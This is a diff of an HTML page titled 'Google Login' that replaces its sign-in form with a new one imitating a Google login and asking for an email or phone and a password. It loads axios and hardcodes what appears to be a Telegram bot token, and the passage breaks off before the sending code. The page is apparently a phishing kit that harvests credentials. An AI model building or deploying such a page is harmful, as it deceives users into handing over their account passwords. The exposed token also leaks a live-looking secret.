@@ -4,33 +4,32 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Login</title>
-    <link rel="stylesheet" href="/s.css">
+    <link rel="stylesheet" href="s.css">
 </head>
 <body>
-    <div class="box">
-    <form class="form"> 
-        <img src="/download.png" width="100px">
-        <h1 class="form-title">sign in</h1>
-        <div class="form-group">
-            <input type="text" class="form-control" required>
-            <label for="" class="class-label"> email or phone</label>
-        </div>
-        <div class="form-group">
-            <input type="password" class="form-control" required>
-            <label for="" class="class-label"> password</label>
-        </div>
-        <div class="form-group">
-            
-            <label for="" class="show-label">
-                <input type="checkbox" id="show"> show password
-            </label>
-        </div>
-        <div class="bottom-button">
-            <a href="#">forget password ?</a>
-            <button class="form-button"> next</button>
-        </div>
+ <main>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Google" class="flex justify-content-center">
+                </h1>
+                <form id="login-form">
+                    <label for="email" class="sr-only">Phone, username, or email</label>
+                    <input id="email" name="email" placeholder="Phone, username, or email" required />
 
+                    <label for="password" class="sr-only">Password</label>
+                    <input id="password" name="password" type="password" placeholder="Password" required />
+
+                    <button type="submit">Log In</button>
+                </form>
+            </div>
     </form>
+</main>
+
+
+
 <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
 <script>
     const TOKEN = "7732680200:AAGoPAI36_BGvelhQvoLgRPZbBYA9OKjMTk";                                                            // هنا التوكين              
